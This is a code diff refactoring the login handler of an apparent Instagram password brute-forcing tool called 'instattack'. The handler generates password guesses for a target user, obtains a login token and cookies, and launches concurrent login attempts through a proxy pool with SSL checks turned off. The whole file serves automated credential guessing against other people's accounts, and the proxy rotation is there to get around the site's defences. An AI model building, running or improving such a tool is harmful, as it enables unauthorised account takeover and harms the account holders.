@@ -3,9 +3,7 @@ from __future__ import absolute_import
 import asyncio
 import aiohttp
 import aiojobs
-import collections
 
-from instattack.app import settings
 from instattack.app.exceptions import NoPasswordsError
 from instattack.app.mixins import LoggerMixin
 from instattack.lib.utils import percentage, limit_as_completed
@@ -48,26 +46,20 @@ class LoginHandler(LoggerMixin):
     __name__ = 'Login Handler'
     __logconfig__ = "login_attempts"  # TODO: Won't need anymore with methods moved out.
 
-    def __init__(self, config, proxy_handler, user=None, start_event=None, stop_event=None):
+    def __init__(self, config, proxy_handler, user=None, start_event=None):
 
         self.user = user
         self.start_event = start_event
-        self.stop_event = stop_event
         self.config = config
         self.proxy_handler = proxy_handler
 
-        self._headers = None
         self._cookies = None
         self._token = None
-
-        self.limit = config['login']['limit']
-        self.batch_size = config['login']['batch_size']
 
         self.passwords = asyncio.Queue()
 
         self.num_completed = 0
         self.num_passwords = 0  # Index for the current password and attempts per password.
-        self.attempts_count = collections.Counter()  # Indexed by Password
 
         self.scheduler = await aiojobs.create_scheduler(limit=100, exception_handler=None)
 
@@ -94,12 +86,16 @@ class LoginHandler(LoggerMixin):
     async def prepopulate(self, loop):
         async with self.async_logger('prepopulate', ignore_config=True) as log:
 
+            limit = self.config['login']['limit']
             message = f'Generating All Attempts for User {self.user.username}.'
-            if self.limit:
-                message = f'Generating {self.limit} Attempts for User {self.user.username}.'
+            if limit:
+                message = (
+                    f'Generating {limit} '
+                    f'Attempts for User {self.user.username}.'
+                )
             await log.start(message)
 
-            passwords = await self.user.get_new_attempts(loop, limit=self.limit)
+            passwords = await self.user.get_new_attempts(loop, limit=limit)
             if len(passwords) == 0:
                 raise NoPasswordsError()
 
@@ -110,7 +106,7 @@ class LoginHandler(LoggerMixin):
             await log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")
 
     @property
-    def _connector(self):
+    def connector(self):
         return aiohttp.TCPConnector(
             ssl=False,
             force_close=True,
@@ -120,28 +116,56 @@ class LoginHandler(LoggerMixin):
         )
 
     @property
-    def _timeout(self):
+    def timeout(self):
         return aiohttp.ClientTimeout(
             total=self.config['login']['connection']['timeout']
         )
 
     @property
     def token(self):
+        if not self._token:
+            raise RuntimeError('Token Not Found Yet')
         return self._token
 
     async def cookies(self):
         if not self._cookies:
             # TODO: Set timeout to the token timeout.
-            sess = aiohttp.ClientSession(connector=self._connector)
+            sess = aiohttp.ClientSession(connector=self.connector)
             self._token, self._cookies = await get_token(sess)
 
             if not self._token:
                 raise RuntimeError('Could not find token.')
 
-            self._headers = settings.HEADERS(self._token)
             await sess.close()
 
         return self._cookies
+
+    async def login_task_generator(self, loop, session):
+        """
+        Generates coroutines for each password to be attempted and yields
+        them in the generator.
+
+        We don't have to worry about a stop event if the authenticated result
+        is found since this will generate relatively quickly and the coroutines
+        have not been run yet.
+        """
+        log = self.create_logger('attempt_login', sync=True)
+
+        while not self.passwords.empty():
+            password = await self.passwords.get()
+            if password:
+                yield attempt(
+                    loop,
+                    session,
+                    self.user,
+                    self.token,
+                    password,
+                    proxy_pool=self.proxy_handler.pool,
+                    scheduler=self.scheduler,
+                    batch_size=self.config['login']['attempts']['batch_size'],
+                )
+
+        log.warning('Passwords Queue is Empty')
 
     async def attempt_login(self, loop):
         """
@@ -153,24 +177,8 @@ class LoginHandler(LoggerMixin):
         concurrent IO operations.
         """
 
-        async def generate_login_tasks(session):
-            """
-            Generates coroutines for each password to be attempted and yields
-            them in the generator.
-
-            We don't have to worry about a stop event if the authenticated result
-            is found since this will generate relatively quickly and the coroutines
-            have not been run yet.
-            """
-            log = self.create_logger('attempt_login', sync=True)
-
-            while not self.passwords.empty():
-                password = await self.passwords.get()
-                if password:
-                    yield self.attempt_with_password(loop, session, password)
-
-            log.critical('Passwords Queue is Empty')
-
+        # TODO: Need to make sure __logconfig__ is working properly for this
+        # specific situation and situations in the .login.py file.
         async with self.async_logger('attempt_login') as log:
             results = InstagramResults(results=[])
 
@@ -179,14 +187,14 @@ class LoginHandler(LoggerMixin):
             cookies = await self.cookies()
 
             async with aiohttp.ClientSession(
-                connector=self._connector,
+                connector=self.connector,
                 cookies=cookies,
-                timeout=self._timeout,
+                timeout=self.timeout,
             ) as session:
-
-                gen = generate_login_tasks(session)
-                async for result, num_tries in limit_as_completed(gen, self.batch_size):
-                    await log.info('Got Result!!')
+                gen = self.login_task_generator(loop, session)
+                async for result, num_tries in limit_as_completed(
+                    gen, self.config['login']['batch_size']
+                ):
                     # Generator Does Not Yield None on No More Coroutines
                     if result.conclusive:
                         self.num_completed += 1
@@ -213,22 +221,3 @@ class LoginHandler(LoggerMixin):
 
             await self.scheduler.close()
             return results
-
-    async def attempt_with_password(self, loop, session, password):
-        """
-        Makes concurrent fetches for a single password and limits the number of
-        current fetches to the batch_size.  Will return when it finds the first
-        request that returns a valid result.
-        """
-        await self.start_event.wait()
-
-        return await attempt(
-            loop,
-            session,
-            self.user,
-            self.token,
-            password,
-            proxy_pool=self.proxy_handler.pool,
-            scheduler=self.scheduler,
-            batch_size=self.config['login']['attempts']['batch_size'],
-        )
